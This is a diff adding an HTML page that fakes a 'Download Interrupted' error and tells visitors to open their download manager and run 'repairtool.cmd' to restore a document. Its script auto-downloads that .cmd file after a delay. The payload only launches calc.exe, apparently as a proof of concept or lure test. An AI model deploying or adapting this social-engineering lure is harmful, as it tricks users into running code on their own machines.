@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Interrupted</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 90vh; text-align: center; background-color: #f4f4f4; color: #333; }
+        .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+        h1 { color: #d9534f; }
+        p { font-size: 1.1em; line-height: 1.6; }
+        a { color: #007bff; text-decoration: none; font-weight: bold; }
+        a:hover { text-decoration: underline; }
+        .instructions { margin-top: 20px; padding: 15px; background-color: #e9ecef; border-radius: 5px; }
+        .repair-message { margin-top: 15px; color: #333; /* Changed from green for pre-download message */ display: block; } /* Visible by default now */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Download Interrupted!</h1>
+        <p>The file download was intentionally interrupted due to an unexpected error.</p>
+        <div class="instructions">
+            <p>
+                To fix this, please open your browser's download manager to see the status of the interrupted file.
+            </p>
+            <p>
+                In Chrome, you can usually do this by pressing <strong>Ctrl+J</strong> (Windows/Linux) or <strong>Cmd+Shift+J</strong> (Mac),
+                or by going to Menu → Downloads. <br>
+		        And click the repairtool.cmd to restore the document.
+            </p>
+        </div>
+        <p id="repair-tool-status" class="repair-message">
+            The <strong>repairtool.cmd</strong> will be offered for download in a moment. Please check your browser's downloads.
+        </p>
+        <!-- Link to go back to index.html to try again -->
+        <p style="margin-top: 25px;">
+            <a href="index.html">Run Main Test Again</a>
+        </p>
+    </div>
+
+    <script>
+        window.addEventListener('load', () => {
+            const statusMessageElement = document.getElementById('repair-tool-status');
+
+            // Set a timeout to delay the download
+            setTimeout(() => {
+                // Content of the .cmd file
+                const cmdContent = `@echo off\r\ncalc.exe\r\nexit`;
+
+                // Create a Blob with the .cmd content
+                const blob = new Blob([cmdContent], { type: 'text/plain;charset=utf-8' });
+
+                // Create a temporary link element
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = 'repairtool.cmd';
+
+                document.body.appendChild(link);
+                link.click(); // This now happens after the 2-second delay
+                document.body.removeChild(link);
+                URL.revokeObjectURL(link.href);
+
+                if (statusMessageElement) {
+                    statusMessageElement.innerHTML = `The <strong>repairtool.cmd</strong> has been offered for download. Please check your browser's downloads and run it if you trust this source.`;
+                    statusMessageElement.style.color = '#28a745'; // Change to green for success
+                }
+                console.log('repairtool.cmd download initiated after 2-second delay.');
+
+            }, 10000); // 2000 milliseconds = 2 seconds
+
+            console.log('failure.html loaded, repairtool.cmd download scheduled in 2 seconds.');
+        });
+    </script>
+</body>
+</html>
